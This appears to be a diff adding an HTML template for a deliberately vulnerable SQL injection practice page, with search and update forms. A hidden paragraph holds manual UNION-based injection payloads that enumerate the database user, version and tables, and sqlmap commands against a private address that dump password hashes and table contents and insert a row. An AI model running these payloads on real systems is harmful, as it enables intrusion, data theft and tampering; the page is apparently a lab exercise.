@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>sql inject</title>
+</head>
+<body>
+		<form method="get" action="/sql_inject_func/">
+			<input name="search" type="text" placeholder="search"><button id="btn" type="submit">search</button><br>
+			{% csrf_token %}
+		</form>
+		
+		<form method="get" action="/sql_inject_update/">
+			<input name="update" type="text" placeholder="update"><button id="btn" type="submit">update</button><br>
+			{% csrf_token %}
+		</form>
+		
+		query_string:{{ query_string }}<br>
+		---------------------------------------------------------------------------------------------<br>
+		result:{{ error }}<br>
+		
+		<p hidden>
+				sql inject by hand -------------------------------------------------------------------------------------------------<br>
+				select * from sign_event where name = 'test'<br>
+				select * from sign_event where name = '[test' order by 7 -- ]'<br>
+				select * from sign_event where name = '[test' union select user(),2,3,4,5,6,7 -- ]'<br>
+				select * from sign_event where name = '[test' union select user(),database(),3,4,5,6,7 -- ]'<br>
+				select * from sign_event where name = '[test' union select user(),database(),version(),4,5,6,7 -- ]'<br>
+				select * from sign_event where name = '[test' union select user(),database(),version(),table_name,5,6,7 from information_schema.tables -- ]'<br>
+				select * from sign_event where name = '[test' union select user(),database(),version(),table_name,5,6,7 from information_schema.tables -- ]'<br>
+				select * from sign_event where name = '[test' union select id,2,3,4,5,6,7 from sign_event -- ]'<br>
+				sql inject by sqlmap -------------------------------------------------------------------------------------------------<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --batch<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --dbs<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --current-db<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --current-user<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --users<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --passwords<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" -D guest --tables<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" -D guest -T sign_event --columns<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" -D guest -T sign_event -C "id,name,limit,status,address,start_time,create_time" --dump<br>
+				sqlmap -u "http://192.168.1.110:8001/sql_inject_func/?search=test" --sql-query "INSERT INTO sign_event VALUES ('23','test',200,1,'test','2018-05-01 12:00:00','2018-05-01 18:00:00');"<br>
+		</p>
+</body>
+</html>
